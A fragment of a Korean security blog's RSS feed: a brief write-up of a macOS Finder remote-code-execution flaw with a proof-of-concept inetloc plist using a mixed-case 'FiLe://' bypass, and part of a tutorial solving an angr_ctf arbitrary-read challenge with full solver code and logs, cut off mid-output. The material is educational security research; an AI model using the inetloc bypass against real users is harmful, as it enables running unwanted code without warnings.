      <guid>https://hackyboiz.github.io/2021/09/28/fabu1ous/2021-09-28/</guid>
      <pubDate>Tue, 28 Sep 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://ssd-disclosure.com/ssd-advisory-macos-finder-rce/</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-macos-finder-rce/">macOS finder RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>macOS Big Sur &#xC774;&#xD558; &#xBC84;&#xC804;</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>&#xD655;&#xC7A5;&#xC790;&#xAC00; <code>inetloc</code>&#xC778; &#xD30C;&#xC77C;&#xC740; macOS Finder&#xB97C; &#xD1B5;&#xD574; &#xC784;&#xC758;&#xC758; &#xCEE4;&#xBA58;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; <code>inetloc</code> &#xD30C;&#xC77C;&#xC774; &#xCCA8;&#xBD80;&#xB41C; &#xC774;&#xBA54;&#xC77C;&#xC744; &#xD074;&#xB9AD;&#xD55C;&#xB2E4;&#xBA74; &#xD504;&#xB86C;&#xD504;&#xD2B8; &#xB610;&#xB294; &#xC5B4;&#xB5A0;&#xD55C; &#xACBD;&#xACE0;&#xB3C4; &#xC5C6;&#xC774; &#xD574;&#xB2F9; &#xD30C;&#xC77C; &#xC18D;&#xC5D0; &#xB2F4;&#xAE34; &#xCEE4;&#xBA58;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xBCF8;&#xB798; <code>inetloc</code> &#xD655;&#xC7A5;&#xC790;&#xB294; &#xC778;&#xD130;&#xB137; &#xC8FC;&#xC18C;&#xC5D0; &#xB300;&#xD55C; &#xBC14;&#xB85C;&#xAC00;&#xAE30;&#xC785;&#xB2C8;&#xB2E4;. RSS feed, telnet &#xC8FC;&#xC18C;, ssh &#xC5F0;&#xACB0;&#xC744; &#xC704;&#xD55C; &#xC11C;&#xBC84; &#xC8FC;&#xC18C;&#xC640; &#xACC4;&#xC815; &#xC815;&#xBCF4; &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>inetloc</code> &#xD30C;&#xC77C;&#xC5D0;&#xC11C;  <code>file://</code> &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; File Quarantine, Gatekeeper&#xC5D0; &#xAC78;&#xB9AC;&#xC9C0; &#xC54A;&#xACE0; &#xB85C;&#xCEEC; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xC784;&#xC758;&#xC758; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xACFC; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs html"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">plist</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">plist</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>URL<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>FiLe:////////////////////////System/Applications/Calculator.app<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plist</span>&gt;</span></code></pre><p>Apple&#xC740; <code>inetloc</code> &#xD30C;&#xC77C;&#xC5D0;&#xC11C; <code>file://</code>&#xC744; &#xC4F0;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xD328;&#xCE58;&#xB97C; &#xC2DC;&#xB3C4;&#xD588;&#xC9C0;&#xB9CC; <code>FiLe://</code>, <code>fIlE://</code> &#xB4F1; &#xB300;&#xC18C;&#xBB38;&#xC790;&#xB97C; &#xC11E;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; <code>fileloc</code> &#xD655;&#xC7A5;&#xC790;&#xC5D0;&#xB3C4; &#xB3D9;&#xC77C;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC5B4; &#xC545;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/mac/">mac</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/finder/">finder</category>
      
      <category domain="https://hackyboiz.github.io/tags/inetloc/">inetloc</category>
      
      
      <comments>https://hackyboiz.github.io/2021/09/28/fabu1ous/2021-09-28/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 핵린이의 angr 정복기 - (6) angr_ctf part.4</title>
      <link>https://hackyboiz.github.io/2021/09/26/j0ker/angr_part6/</link>
      <guid>https://hackyboiz.github.io/2021/09/26/j0ker/angr_part6/</guid>
      <pubDate>Sun, 26 Sep 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2021/09/26/j0ker/angr_part6/5klo52.jpg&quot; alt=&quot;5klo52.jpg&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;&amp;#xC774;&amp;#xC804;-&amp;#xAE00;-&amp;#xBC14;&amp;#xB85C;&amp;#xAC00;&amp;#xAE3</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2021/09/26/j0ker/angr_part6/5klo52.jpg" alt="5klo52.jpg"></p><h1 id="&#xC774;&#xC804;-&#xAE00;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC774;&#xC804;-&#xAE00;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC774;&#xC804; &#xAE00; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC774;&#xC804; &#xAE00; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/07/10/j0ker/angr_part1/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (1) &#xC2DC;&#xC791;</a></p><p><a href="https://hackyboiz.github.io/2021/07/21/j0ker/angr_part2/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (2) Symbolic Execution</a></p><p><a href="https://hackyboiz.github.io/2021/08/04/j0ker/angr_part3/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (3) angr_ctf part.1</a></p><p><a href="https://hackyboiz.github.io/2021/08/15/j0ker/angr_part4/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (4) angr_ctf part.2</a></p><p><a href="https://hackyboiz.github.io/2021/08/25/j0ker/angr_part5/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (5) angr_ctf part.3</a></p><p>[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (6) angr_ctf part.4 &#x2190; Here!</p><h1 id="&#xC778;&#xC0AC;&#xB9D0;"><a href="#&#xC778;&#xC0AC;&#xB9D0;" class="headerlink" title="&#xC778;&#xC0AC;&#xB9D0;"></a>&#xC778;&#xC0AC;&#xB9D0;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. j0ker &#xC785;&#xB2C8;&#xB2E4;!  &#xC5EC;&#xB7EC;&#xBD84;&#xB4E4; &#xC798; &#xB530;&#xB77C; &#xC624;&#xACE0; &#xACC4;&#xC2E0;&#xAC00;&#xC694;? &#xC544;&#xB2C8;&#xBA74; &#xC800;&#xBCF4;&#xB2E4;&#xB3C4; &#xC55E;&#xC11C;&#xB098;&#xAC00;&#xACE0; &#xACC4;&#xC2E4;&#xC9C0;&#xB3C4;&#x2026; &#xB4DC;&#xB514;&#xC5B4; &#xC624;&#xB298;&#xB85C; angr_ctf&#xAC00; &#xB9C8;&#xBB34;&#xB9AC; &#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xD558; &#xC624;&#xB298;&#xC740; &#xC774;&#xC81C; 3&#xBB38;&#xC81C;&#xB9CC; &#xBCF4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;! angr&#xB85C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xD558;&#xB294; &#xAC78; &#xCC0D;&#xBA39;&#xD574;&#xBCFC;&#xAC74;&#xB370;&#xC694;. &#xD6C4;&#xB531; &#xBCF4;&#xC2DC;&#xC8E0;!</p><h1 id="15-angr-arbitrary-read"><a href="#15-angr-arbitrary-read" class="headerlink" title="15_angr_arbitrary_read"></a>15_angr_arbitrary_read</h1><p>&#xC774; &#xBB38;&#xC81C;&#xB294; &#xD2B9;&#xC815; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC77D;&#xC5B4;&#xC57C;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xC778;&#xB4EF; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/09/26/j0ker/angr_part6/Untitled.png" alt="Untitled"></p><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xD0A4;&#xAC12;&#xACFC; &#xBB38;&#xC790;&#xC5F4; &#xC774; &#xB450; &#xAC1C;&#xC758; &#xC778;&#xD48B;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD0A4;&#xAC12;&#xC744; &#xD1B5;&#xD574; &#xC5B4;&#xB290; <code>puts</code>&#xC5D0;&#xC11C; &#xCD9C;&#xB825;&#xC744; &#xD560;&#xAC83;&#xC778;&#xC9C0;, &#xB610; &#xBB34;&#xC5C7;&#xC744; &#xCD9C;&#xB825;&#xD560; &#xAC83;&#xC778;&#xC9C0;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xAC8C; &#xB418;&#xC8E0;. &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC774; &#xBB38;&#xC81C;&#xB294; &#xC800; &#xC911;&#xAC04;&#xC5D0; &#xC788;&#xB294; <code>puts</code>&#xB85C; &#xC9C1;&#xC811; <code>Good Job</code>&#xC744; &#xCD9C;&#xB825;&#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;.</p><p><img src="/2021/09/26/j0ker/angr_part6/1.png" alt="Untitled"></p><p>&#xC77C;&#xB2E8; <code>Good Job</code>&#xC758; &#xC8FC;&#xC18C;&#xB294; &#xC54C;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xB300;&#xB7B5;&#xC801;&#xC778; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xC138;&#xC6CC;&#xBCF4;&#xC8E0;.</p><p>&#xBA3C;&#xC800; &#xCCAB;&#xBC88;&#xC9F8; &#xC778;&#xD48B;&#xC778; &#xD0A4;&#xAC12;&#xC740; &#xBB34;&#xC870;&#xAC74; <code>0x27dfb7c</code>&#xAC00; &#xB418;&#xC5B4;&#xC57C;&#xACA0;&#xC8E0;. &#xADF8;&#xB9AC;&#xACE0; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xD48B;&#xC740; 20&#xBC14;&#xC774;&#xD2B8;&#xAE4C;&#xC9C0; &#xC785;&#xB825;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB450; &#xBC88;&#xC7AC; &#xC778;&#xD48B;&#xC740; <code>v4</code>&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xACE0; <code>v4</code>&#xC758; &#xC704;&#xCE58;&#xB294; <code>ebp-0x1C</code>&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>s</code>&#xB97C; &#xCD9C;&#xB825;&#xD558;&#xB294;&#xB370;, <code>s</code>&#xC758; &#xC704;&#xCE58;&#xB294; <code>ebp-0xC</code>&#xC8E0;. &#xADF8;&#xB7EC;&#xBA74; <code>v4</code>&#xC640; <code>s</code>&#xC758; &#xC8FC;&#xC18C; &#xCC28;&#xC774;&#xB294; 0x10&#xC774;&#xACE0; &#xB450;&#xBC88;&#xC9F8; &#xC778;&#xD48B;&#xC740; 20&#xBC14;&#xC774;&#xD2B8; &#xC785;&#xB825;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xB2C8;&#xAE4C; <code>s</code>&#xB97C; &#xBAA8;&#xB450; &#xB36E;&#xC744; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>s</code>&#xC758; &#xC8FC;&#xC18C;&#xB97C; <code>Good Job</code>&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xBC14;&#xAFB8;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB418;&#xACA0;&#xB124;&#xC694;!</p><p>&#xC77C;&#xB2E8; &#xBA3C;&#xC800; <code>scanf</code>&#xB97C; &#xD6C4;&#xD0B9;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReplacementScanf</span>(<span class="hljs-params">angr.SimProcedure</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, format_string, scanf0_address, scanf1_address</span>):</span>    scanf0 = claripy.BVS(<span class="hljs-string">&apos;scanf0&apos;</span>, <span class="hljs-number">32</span>)    scanf1 = claripy.BVS(<span class="hljs-string">&apos;scanf1&apos;</span>, <span class="hljs-number">20</span>*<span class="hljs-number">8</span>)    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> scanf1.chop(bits=<span class="hljs-number">8</span>):      self.state.add_constraints(char &gt;= <span class="hljs-number">0x21</span>, char &lt;= <span class="hljs-number">0x7e</span>)        self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)    self.state.memory.store(scanf1_address, scanf1, endness=archinfo.arch.Endness.BE)        self.state.globals[<span class="hljs-string">&apos;solution0&apos;</span>] = scanf0    self.state.globals[<span class="hljs-string">&apos;solution1&apos;</span>] = scanf1    scanf_symbol = <span class="hljs-string">&apos;__isoc99_scanf&apos;</span>project.hook_symbol(scanf_symbol, ReplacementScanf())</code></pre><p>&#xBA3C;&#xC800; &#xC778;&#xD48B;&#xAC12;&#xC758; &#xD06C;&#xAE30;&#xC5D0; &#xB9DE;&#xCDB0; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C;, &#xB450; &#xBC88;&#xC9F8; &#xC785;&#xB825;&#xAC12;&#xC758; &#xAC01;&#xAC01;&#xC758; &#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xBB38;&#xC790;&#xC77C; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC870;&#xAC74;&#xC81C;&#xC57D;&#xC744; &#xC124;&#xC815;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; <code>chop(bits=n)</code>&#xC740; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xC9C0;&#xC815;&#xD55C; &#xBE44;&#xD2B8; &#xD06C;&#xAE30;&#xB85C; &#xB098;&#xB220;&#xC8FC;&#xB294; &#xBA54;&#xC18C;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. &#xBE44;&#xD2B8;&#xBCA1;&#xD130;&#xC5D0; &#xC788;&#xB294; &#xB370;&#xC774;&#xD130;&#xB294; &#xBE44;&#xD2B8; &#xB2E8;&#xC704;&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; 8&#xBE44;&#xD2B8;, &#xC989; 1&#xBC14;&#xC774;&#xD2B8;&#xB85C; &#xB098;&#xB208; &#xB2E4;&#xC74C; &#xBC14;&#xC774;&#xD2B8; &#xBCC4;&#xB85C; &#xC870;&#xAC74; &#xC81C;&#xC57D;&#xC744; &#xAC78; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xAC01;&#xAC01;&#xC758; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB97C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; &#xC8FC;&#xC758;&#xD574;&#xC57C;&#xD560; &#xC810;&#xC740; &#xC778;&#xD2F0;&#xC800; &#xB370;&#xC774;&#xD130;&#xB294; &#xBCF4;&#xD1B5; &#xB9AC;&#xD2C0;&#xC5D4;&#xB514;&#xC548;&#xC73C;&#xB85C; &#xC77D;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC;&#xC758; &#xC5D4;&#xB514;&#xC548; &#xADF8;&#xB798;&#xB3C4; &#xC124;&#xC815;&#xD574;&#xC918;&#xB3C4; &#xB418;&#xC9C0;&#xB9CC;, &#xBB38;&#xC790;&#xC5F4; &#xAC19;&#xC740; &#xACBD;&#xC6B0; &#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC5ED;&#xC21C;&#xC73C;&#xB85C; &#xC77D;&#xD788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC704;&#xC640; &#xAC19;&#xC774; &#xBE45;&#xC5D4;&#xB514;&#xC548;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD574;&#xB3C4; &#xB418;&#xACE0; &#xC544;&#xC608; &#xC778;&#xC790;&#xB97C; &#xC548;&#xC8FC;&#xC5B4;&#xB3C4; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_puts</span>(<span class="hljs-params">state</span>):</span>  puts_parameter = state.memory.load(state.regs.esp+<span class="hljs-number">4</span>, <span class="hljs-number">4</span>, endness=project.arch.memory_endness)  <span class="hljs-keyword">if</span> state.se.symbolic(puts_parameter):    good_job_string_address = <span class="hljs-number">0x484F4A47</span>    is_vulnerable_expression = puts_parameter == good_job_string_address    copied_state = state.copy()    copied_state.add_constraints(is_vulnerable_expression)    <span class="hljs-keyword">if</span> copied_state.satisfiable():      state.add_constraints(is_vulnerable_expression)      <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>    <span class="hljs-keyword">else</span>:      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></code></pre><p><code>scanf</code> &#xD6C4;&#xD0B9;&#xC744; &#xD558;&#xACE0; &#xB098;&#xBA74; &#xC774;&#xC81C; <code>puts</code> &#xD568;&#xC218;&#xC758; &#xC778;&#xC790;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xD568;&#xC218;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4; &#xC90D;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; <code>puts</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xBA74; &#xC778;&#xC790;&#xB294; <code>esp+4</code>&#xC5D0; &#xC704;&#xCE58;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774; &#xC704;&#xCE58;&#xBD80;&#xD130; 4&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC77D;&#xC5B4;&#xC635;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xB9CC;&#xC57D; &#xD574;&#xB2F9; &#xBCC0;&#xC218;&#xAC00; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xB85C; &#xC0AC;&#xC6A9;&#xC790; &#xC778;&#xD48B;&#xC5D0; &#xB530;&#xB77C; &#xBC14;&#xB010;&#xB2E4;&#xBA74; &#xD574;&#xB2F9; &#xAC12;&#xC774; <code>Good Job</code> &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xC8FC;&#xC18C;&#xC778;&#xC9C0;&#xB97C; &#xCCB4;&#xD06C;&#xD558;&#xB294; &#xC870;&#xAC74;&#xC81C;&#xC57D;&#xC744; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xB2F9; &#xC870;&#xAC74;&#xC81C;&#xC57D;&#xC5D0; &#xB9CC;&#xC871;&#xD558;&#xB294; state&#xAC00; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74; &#xD655;&#xC815;&#xC801;&#xC73C;&#xB85C; &#xC870;&#xAC74;&#xC81C;&#xC57D;&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>  puts_address = <span class="hljs-number">0x08048370</span>  <span class="hljs-keyword">if</span> state.addr == puts_address:    <span class="hljs-keyword">return</span> check_puts(state)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>simulation.explore(find=is_successful)</code></pre><p>&#xADF8;&#xB9AC;&#xACE0; &#xC911;&#xAC04;&#xC5D0; &#xC788;&#xB294; <code>puts</code>&#xC5D0; &#xB3C4;&#xB2EC;&#xD588;&#xC744; &#xB54C; &#xC704;&#xC5D0;&#xC11C; &#xB9CC;&#xB4E0; <code>check_puts</code>&#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC790;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC124;&#xC815;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xB05D;!</p><h2 id="sol15-py"><a href="#sol15-py" class="headerlink" title="sol15.py"></a>sol15.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> archinfo<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReplacementScanf</span>(<span class="hljs-params">angr.SimProcedure</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, format_string, scanf0_address, scanf1_address</span>):</span>      scanf0 = claripy.BVS(<span class="hljs-string">&apos;scanf0&apos;</span>, <span class="hljs-number">32</span>)      scanf1 = claripy.BVS(<span class="hljs-string">&apos;scanf1&apos;</span>, <span class="hljs-number">20</span>*<span class="hljs-number">8</span>)      <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> scanf1.chop(bits=<span class="hljs-number">8</span>):        self.state.add_constraints(char &gt;= <span class="hljs-number">0x21</span>, char &lt;= <span class="hljs-number">0x7e</span>)            self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)      self.state.memory.store(scanf1_address, scanf1, endness=archinfo.arch.Endness.BE)        self.state.globals[<span class="hljs-string">&apos;solution0&apos;</span>] = scanf0      self.state.globals[<span class="hljs-string">&apos;solution1&apos;</span>] = scanf1    scanf_symbol = <span class="hljs-string">&apos;__isoc99_scanf&apos;</span>  project.hook_symbol(scanf_symbol, ReplacementScanf())  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_puts</span>(<span class="hljs-params">state</span>):</span>    puts_parameter = state.memory.load(state.regs.esp+<span class="hljs-number">4</span>, <span class="hljs-number">4</span>, endness=project.arch.memory_endness)    <span class="hljs-keyword">if</span> state.se.symbolic(puts_parameter):      good_job_string_address = <span class="hljs-number">0x484F4A47</span>      is_vulnerable_expression = puts_parameter == good_job_string_address      copied_state = state.copy()      copied_state.add_constraints(is_vulnerable_expression)      <span class="hljs-keyword">if</span> copied_state.satisfiable():        state.add_constraints(is_vulnerable_expression)        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>      <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>    <span class="hljs-keyword">else</span>:      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    puts_address = <span class="hljs-number">0x08048370</span>    <span class="hljs-keyword">if</span> state.addr == puts_address:      <span class="hljs-keyword">return</span> check_puts(state)    <span class="hljs-keyword">else</span>:      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  simulation.explore(find=is_successful)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution0 = solution_state.se.eval(solution_state.globals[<span class="hljs-string">&apos;solution0&apos;</span>], cast_to=int)    solution1 = solution_state.se.eval(solution_state.globals[<span class="hljs-string">&apos;solution1&apos;</span>], cast_to=bytes)    print(<span class="hljs-string">&apos;{} {}&apos;</span>.format(solution0, solution1))      <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol15.py <span class="hljs-number">15</span>_angr_arbitrary_read WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">13</span>:<span class="hljs-number">02</span>:<span class="hljs-number">28</span>,<span class="hljs-number">781</span> | angr.project | Address <span class="hljs-keyword">is</span> already hooked, during hook(<span class="hljs-number">0x48554e80</span>, &lt;SimProcedure ReplacementScanf&gt;). Re-hooking.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">13</span>:<span class="hljs-number">02</span>:<span class="hljs-number">28</span>,<span class="hljs-number">862</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">13</span>:<span class="hljs-number">02</span>:<span class="hljs-number">28</span>,<span class="hljs-number">863</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">13</span>:<span class="hljs-number">02</span>:<span class="hljs-number">28</span>,<span class="hljs-number">863</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-19</span> <span class="hljs-number">13</span>:<span class="hljs-number">02</span>:<span class="hljs-number">28</span>,<span class="hljs-number">863</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) 